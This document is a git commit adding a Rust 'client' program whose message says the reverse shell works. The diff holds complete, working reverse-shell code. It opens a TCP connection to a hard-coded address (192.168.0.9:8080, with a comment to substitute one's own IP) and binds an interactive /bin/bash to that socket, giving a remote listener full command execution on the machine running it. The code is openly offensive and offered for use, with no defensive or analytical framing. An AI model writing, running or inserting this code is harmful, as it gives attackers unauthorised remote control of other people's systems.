4305163f3f9a05b5e749a24088681400a78d386c
Krisna Pranav <krisna.pranav@gmail.com>
2022-03-10 19:27:40 +0530

    client: added client
    reverse shell is working quite good
    TODO's: need to get user input and connect to that ip address

--- client/src/main.rs
+++ client/src/main.rs
@@ -1,3 +1,18 @@
+use std::net::TcpStream;
+use std::os::unix::io::{AsRawFd, FromRawFd};
+use std::process::{Command, Stdio};
+
 fn main() {
-    println!("Hello, world!");
+    let sock = TcpStream::connect("192.168.0.9:8080").unwrap(); /* your ip address here*/
+    let fd = sock.as_raw_fd();
+
+    Command::new("/bin/bash")
+        .arg("-i")
+        .stdin(unsafe { Stdio::from_raw_fd(fd) })
+        .stdout(unsafe { Stdio::from_raw_fd(fd) })
+        .stderr(unsafe { Stdio::from_raw_fd(fd) })
+        .spawn()
+        .unwrap()
+        .wait()
+        .unwrap();
 }
